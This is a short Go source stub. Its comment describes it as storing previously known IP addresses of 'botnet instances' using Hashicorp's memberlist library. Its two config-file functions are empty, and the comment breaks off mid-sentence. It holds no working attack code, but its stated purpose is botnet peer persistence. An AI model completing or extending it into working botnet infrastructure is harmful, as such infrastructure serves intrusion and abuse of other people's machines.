package main

import (
  "fmt"
  "github.com/hashicorp/memberlist"
  "common"
  "encoding/json"
)
/*******************************************************************************
  memberlist.config will be a formatted file that stores information about the
  botnet instances memberlist (a library provided by great folks at Hashicorp)

  The purpose of this file is to maintain a persistent record of previously
  known ips on the botnet incase a file
*******************************************************************************/

/** Marshall passed Config into JSON, write it to a file **/
func newConfigFile(conf Config) {

}

/** Read memberlist.config, return it as a Config struct **/
func readConfigFile() Config {

}
